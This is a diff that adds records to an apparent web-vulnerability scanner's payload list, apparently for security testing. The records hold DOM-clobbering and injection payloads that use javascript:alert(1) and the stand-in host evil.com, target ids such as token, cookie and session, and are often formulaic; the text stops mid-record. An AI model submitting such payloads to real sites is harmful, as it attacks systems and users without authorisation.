@@ -273,5 +273,1369 @@
       "expected_status_code": 200,
       "success_regex": ""
     }
+  },
+  {
+    "payload_id": "OWP-74000",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<a id=\"x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74001",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<a id=\"x\" name=\"y\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74002",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<a id=\"x\" href=\"javascript:alert(1)\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74003",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<a id=\"x\" href=\"http://evil.com\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74004",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<area id=\"x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74005",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<area id=\"x\" name=\"y\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74006",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<area id=\"x\" href=\"javascript:alert(1)\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74007",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<area id=\"x\" href=\"http://evil.com\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74008",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<img id=\"x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74009",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<img id=\"x\" name=\"y\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74010",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<img id=\"x\" href=\"javascript:alert(1)\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74011",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<img id=\"x\" href=\"http://evil.com\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74012",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<form id=\"x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74013",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<form id=\"x\" name=\"y\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74014",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<form id=\"x\" href=\"javascript:alert(1)\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74015",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<form id=\"x\" href=\"http://evil.com\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74016",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<input id=\"x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74017",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<input id=\"x\" name=\"y\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74018",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<input id=\"x\" href=\"javascript:alert(1)\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74019",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<input id=\"x\" href=\"http://evil.com\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74020",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<button id=\"x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74021",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<button id=\"x\" name=\"y\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74022",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<button id=\"x\" href=\"javascript:alert(1)\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74023",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<button id=\"x\" href=\"http://evil.com\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74024",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<select id=\"x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74025",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<select id=\"x\" name=\"y\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74026",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<select id=\"x\" href=\"javascript:alert(1)\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74027",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<select id=\"x\" href=\"http://evil.com\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74028",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<textarea id=\"x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74029",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<textarea id=\"x\" name=\"y\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74030",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<textarea id=\"x\" href=\"javascript:alert(1)\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74031",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<textarea id=\"x\" href=\"http://evil.com\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74032",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<iframe id=\"x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74033",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<iframe id=\"x\" name=\"y\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74034",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<iframe id=\"x\" href=\"javascript:alert(1)\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74035",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<iframe id=\"x\" href=\"http://evil.com\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74036",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<embed id=\"x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74037",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<embed id=\"x\" name=\"y\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74038",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<embed id=\"x\" href=\"javascript:alert(1)\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74039",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<embed id=\"x\" href=\"http://evil.com\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74040",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<object id=\"x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74041",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<object id=\"x\" name=\"y\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74042",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<object id=\"x\" href=\"javascript:alert(1)\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74043",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<object id=\"x\" href=\"http://evil.com\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74044",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<param id=\"x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74045",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<param id=\"x\" name=\"y\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74046",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<param id=\"x\" href=\"javascript:alert(1)\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74047",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<param id=\"x\" href=\"http://evil.com\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74048",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<anchor id=\"x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74049",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<anchor id=\"x\" name=\"y\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74050",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<anchor id=\"x\" href=\"javascript:alert(1)\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74051",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<anchor id=\"x\" href=\"http://evil.com\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74052",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<a id=\"x\" href=\"http://evil.com\"></a>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74053",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<form id=\"x\"><input name=\"x\" value=\"y\"></form>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74054",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<img id=\"x\" src=\"http://evil.com/x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74055",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<iframe id=\"x\" src=\"http://evil.com\"></iframe>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74056",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<a id=\"y\" href=\"http://evil.com\"></a>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74057",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<form id=\"y\"><input name=\"x\" value=\"y\"></form>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74058",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<img id=\"y\" src=\"http://evil.com/x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74059",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<iframe id=\"y\" src=\"http://evil.com\"></iframe>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74060",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<a id=\"z\" href=\"http://evil.com\"></a>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74061",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<form id=\"z\"><input name=\"x\" value=\"y\"></form>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74062",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<img id=\"z\" src=\"http://evil.com/x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74063",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<iframe id=\"z\" src=\"http://evil.com\"></iframe>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74064",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<a id=\"config\" href=\"http://evil.com\"></a>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74065",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<form id=\"config\"><input name=\"x\" value=\"y\"></form>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74066",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<img id=\"config\" src=\"http://evil.com/x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74067",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<iframe id=\"config\" src=\"http://evil.com\"></iframe>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74068",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<a id=\"settings\" href=\"http://evil.com\"></a>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74069",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<form id=\"settings\"><input name=\"x\" value=\"y\"></form>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74070",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<img id=\"settings\" src=\"http://evil.com/x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74071",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<iframe id=\"settings\" src=\"http://evil.com\"></iframe>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74072",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<a id=\"user\" href=\"http://evil.com\"></a>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74073",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<form id=\"user\"><input name=\"x\" value=\"y\"></form>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74074",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<img id=\"user\" src=\"http://evil.com/x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74075",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<iframe id=\"user\" src=\"http://evil.com\"></iframe>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74076",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<a id=\"admin\" href=\"http://evil.com\"></a>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74077",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<form id=\"admin\"><input name=\"x\" value=\"y\"></form>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74078",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<img id=\"admin\" src=\"http://evil.com/x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74079",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<iframe id=\"admin\" src=\"http://evil.com\"></iframe>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74080",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<a id=\"token\" href=\"http://evil.com\"></a>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74081",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<form id=\"token\"><input name=\"x\" value=\"y\"></form>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74082",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<img id=\"token\" src=\"http://evil.com/x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74083",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<iframe id=\"token\" src=\"http://evil.com\"></iframe>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74084",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<a id=\"cookie\" href=\"http://evil.com\"></a>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74085",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<form id=\"cookie\"><input name=\"x\" value=\"y\"></form>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74086",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<img id=\"cookie\" src=\"http://evil.com/x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74087",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<iframe id=\"cookie\" src=\"http://evil.com\"></iframe>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74088",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<a id=\"session\" href=\"http://evil.com\"></a>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74089",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<form id=\"session\"><input name=\"x\" value=\"y\"></form>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74090",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<img id=\"session\" src=\"http://evil.com/x\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74091",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<iframe id=\"session\" src=\"http://evil.com\"></iframe>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74092",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "<a id=\"xsrf\" href=\"http://evil.com\"></a>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<a|<img|<form"
+    }
+  },
+  {
+    "payload_id": "OWP-74093",
+    "vulnerability_category": "Injection (DOM Clobbering)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
